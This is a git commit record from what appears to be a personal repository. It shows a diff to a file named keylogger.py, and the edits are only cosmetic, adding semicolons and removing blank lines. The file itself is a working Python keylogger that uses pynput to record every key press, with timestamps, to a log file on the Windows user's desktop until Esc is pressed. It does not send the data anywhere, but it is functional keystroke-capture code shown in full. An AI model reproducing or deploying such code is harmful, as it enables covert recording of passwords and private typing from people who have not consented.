f6fae2e11e52cef529ab908070b8e4f6137e8afb
xtayicy <xtayicy@gmail.com>
2022-05-15 18:26:02 +0800

    python

--- keylogger.py
+++ keylogger.py
@@ -3,24 +3,19 @@ from pynput.keyboard import Listener, Key
 import os
 import logging
 
+username = os.getlogin();
 
+directory = "C:/Users/%s/Desktop"%username;
+print(directory);
 
-username = os.getlogin()
-
-directory = "C:/Users/%s/Desktop"%username
-print(directory)
-
-logging.basicConfig(filename="%s/log.txt"%directory, level=logging.DEBUG, format="%(asctime)s: %(message)s")
+logging.basicConfig(filename="%s/log.txt"%directory, level=logging.DEBUG, format="%(asctime)s: %(message)s");
 
 def on_press(key):
-    logging.info(key)
-    
+    logging.info(key);
 
 def on_release(key):
     if key == Key.esc:
         return False
 
-
 with Listener(on_press=on_press, on_release=on_release) as listener:
-    listener.join()
-
+    listener.join();
